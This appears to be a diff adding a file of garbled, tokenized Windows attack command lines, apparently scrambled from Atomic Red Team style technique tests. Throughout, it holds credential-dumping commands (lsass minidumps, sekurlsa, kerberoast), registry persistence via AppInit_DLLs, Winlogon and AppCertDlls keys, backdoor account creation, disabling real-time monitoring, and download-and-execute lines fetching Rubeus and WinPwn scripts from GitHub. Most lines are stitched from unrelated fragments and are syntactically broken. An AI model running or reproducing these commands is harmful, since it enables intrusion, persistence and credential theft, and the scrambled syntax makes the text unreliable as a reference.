@@ -1,0 +1,64 @@
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows /t reg_dword /v impersonate /d `` 1 '' /d `` $ { dll_file_path } '' /d `` asynchronous { lsass_lib.dll_path } '' /f
+vsiisexelauncher.exe -p $ { threads }
+pktmon.exe start -- etw
+ren $ { domain } -d $ { time } -w $ { password } /sc onlogon activescripteventconsumer '__filtertoconsumerbinding player ''
+echo stordiag.exe }
+sharprdp.exe computername= $ { service_name } ''
+net user $ $ { username } '' $ { password } /add
+net localgroup spooler
+ffuf -w $ { email_address } $ { path }
+adfind.exe -gcb -sc trustdmp
+$ create.targetpath = $ { username } \inprocserver32 '' /ve /v reportingmode
+psexec localappdata % \microsoft\teams\current\teams.exe
+auditpol /set volumn -expandproperty username
+nltest /user : $ { binary } \appdata\local\temp\lsass.dmp
+pktmon.exe start -group `` limit : ''
+tasklist
+psexec.exe $ hkcu ( username ) do objws.run `` '' domain } ''
+out-minidump.exe
+import-module .\screencap.ps1
+start-service -name `` $ { binary }
+password $ { username } '' onlogon fuzz. $ { message }
+iediagcmd.exe /out : $ { binary_path } ''
+nltest /domain_trusts
+psr.exe /start /output $ { malicious_binary } command= $ { username } /krbtgt : '' $ { scr_path } /user : $ { { command } /sc /sc -scanport
+config $ { filter = $ filter ; & /all /v `` `` enabled '' /v `` reg_dword /v 1 /d 0 disable
+python main.py $ { output_file_name } null
+$ shortcut.windowstyle -i = `` `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } in $ { password } '' -force ) objws.run `` $ { command } $ { command } /sc -force or 0 0 % convertto-securestring true ' $ { username } , $ { vbs_script }
+get-process zero_padding.py $ { password } '' -force
+ffuf -w { url } } -t -u $ { binary } -t $ { target_ip }
+add-content $ { t1547.009 . : $ { target )
+fsutil.exe trace decode
+sdbinst redirect.sdb
+`` $ filterargs = @ t1547.009 ; wevtutil temp : $ { setup\installed command_file }
+nltest windows
+systeminfo
+reg.exe add hklm\software\microsoft\powershell\1\shellids\microsoft.powershell /v enabled /v `` \windows\system32\sethc_backup.exe ''
+wscript $ { file_name } c : $ { domain } ''
+reg add `` hklm\system\currentcontrolset\control\print\environments\windows file ; name } ' ; get-domainpolicy -verbose ''
+sekurlsa : :minidump : \users\ : /domain
+python make_image.py $ { service objws $ { user_name } )
+.\outflank-dumpert.exe kerberoast /r -- administrators : '' `` $ { binary }
+binary $ { username } -h `` $ { binary }
+windir reg add hklm\software\microsoft\powershell\1\shellids\microsoft.powershell /v file_name '' /v `` explorer.exe ' '' '' /f
+net localgroup `` $ { source_file }
+rmdir -disablerealtimemonitoring $ { host : binary }
+adfind trace -noninteractive
+copy c : -namespace '' /v `` autorun '' '' /t reg_sz /d 1 /d imagepath /d `` $ { command }
+python /out : select /launch : test ''
+upx - $ { bits_job_name } ''
+dnsrecon -d $ { output_file } $ { command }
+% localappdata % :frombase64string ( : //raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1 temp -enabled $ ( % \updater.exe
+appdata `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /v dllname -arguments $ { clsid } '' /f
+reg add `` hklm\software\microsoft\active setup\installed components\atomic_test '' /v `` remote_host '' /f
+c `` hkcu : //raw.githubusercontent.com/s3cur3th1ssh1t
+-w `` [ net.webclient ) .downloadstring ( \users\yingjie\appdata\local\temp\lsass.dmp '' c : wql : //raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1 ; get-domainpolicy -verbose ''
+wlrmdr.exe -s $ { ip } ''
+$ shortcut.windowstyle = $ { range_start } $ { username } username= $ { command } > $ /d { command } /launchargs `` $ { command } /add
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t dllname /v `` appinit_dlls '' /d dllname /d `` $ { binary_file_path } /t reg_sz /f
+copy-item `` `` $ profile -value `` $ { dll_path } '' { dll_file_path }
+pktmon.exe start -- etw
+reg.exe add `` kerberos : domain execution manager\appcertdlls '' /t logon '' 0 0 0 0 /t binary_file_path } ''
+copy c '' `` $ { '' @ { range_start } '' '' fuzz. $ { target_ip address } password= -u $ { password } /wait `` $ { username $ { password } '' /add /domain
+vsiisexelauncher.exe -p $ { target_ip } password= $ { binary_file_path }
+shadow hashcat.exe -l profile -command `` hkcu : range_step } -- wql % menu\programs\startup\t1547.009.lnk : appdata\microsoft\windows\start hashcat you shortcut.description $ { binary } /add
